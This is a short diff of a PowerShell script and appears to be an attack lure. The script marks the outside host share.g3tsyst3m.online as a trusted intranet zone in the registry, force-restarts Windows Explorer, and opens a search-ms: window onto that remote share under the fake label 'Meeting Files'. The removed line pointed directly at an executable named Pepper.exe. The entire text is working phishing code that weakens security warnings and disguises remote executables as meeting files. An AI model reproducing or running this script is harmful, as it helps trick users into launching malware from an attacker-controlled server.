@@ -1,4 +1,4 @@
 if (-not (Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\g3tsyst3m.online\share')) { New-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\g3tsyst3m.online\share' -Force | Out-Null }; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\g3tsyst3m.online\share' -Name '*' -Value 1 -Type DWord
 Stop-Process -Name "explorer" -Force
 Start-Sleep -Seconds 5
-explorer.exe "search-ms:query=*&crumb=location:\\share.g3tsyst3m.online\shared-files\Pepper.exe&displayname=Meeting Files"
+explorer.exe "search-ms:query=*&crumb=location:\\share.g3tsyst3m.online\shared-files&displayname=Meeting Files"
